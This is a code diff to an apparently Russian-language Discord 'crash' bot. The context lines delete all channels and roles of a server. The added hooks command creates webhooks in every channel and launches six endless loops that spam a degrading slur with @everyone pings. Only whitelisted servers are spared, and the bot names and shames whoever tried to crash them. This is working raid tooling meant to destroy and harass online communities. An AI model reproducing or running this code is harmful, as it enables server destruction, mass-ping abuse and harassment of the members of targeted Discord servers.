@@ -59,7 +59,28 @@ async def chistch(ctx):
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
             continue
     print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
-    
+   
+async def spamhook(ctx):
+  while True:
+    for channel in ctx.guild.channels:
+      try:
+        h = await channel.webhooks()
+        for f in h:
+          await f.send(content='Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone ', wait=True)
+      except:
+        continue
+
+async def crhooks(ctx):
+  print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
+  for channel in ctx.guild.text_channels: 
+    try:
+      await channel.create_webhook(name='GLUSHA WAS HERE')
+      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
+    except:
+      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
+      continue
+  print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")
+
 async def chistrl(ctx):
     print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
     roles = ctx.guild.roles
@@ -240,6 +261,22 @@ async def gif(ctx):
      await channel.send("https://gfycat.com/flakyacrobatickusimanse")
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")
+
+@client.command()
+async def hooks(ctx):
+  id = ctx.message.guild.id
+  if id in gwhit:
+    await ctx.send("Этот сервер ЗАЩИЩЕН! Я его НЕ ТРОНУ!")
+    await ctx.send(f"Вас пытался крашнуть {ctx.message.author.mention}, но обосрался, id - {ctx.message.author.id}")
+  else:
+    await crhooks(ctx)
+    asyncio.create_task(spamhook(ctx))
+    asyncio.create_task(spamhook(ctx))
+    asyncio.create_task(spamhook(ctx))
+    asyncio.create_task(spamhook(ctx))
+    asyncio.create_task(spamhook(ctx))
+    asyncio.create_task(spamhook(ctx))
+
 
 
 try:
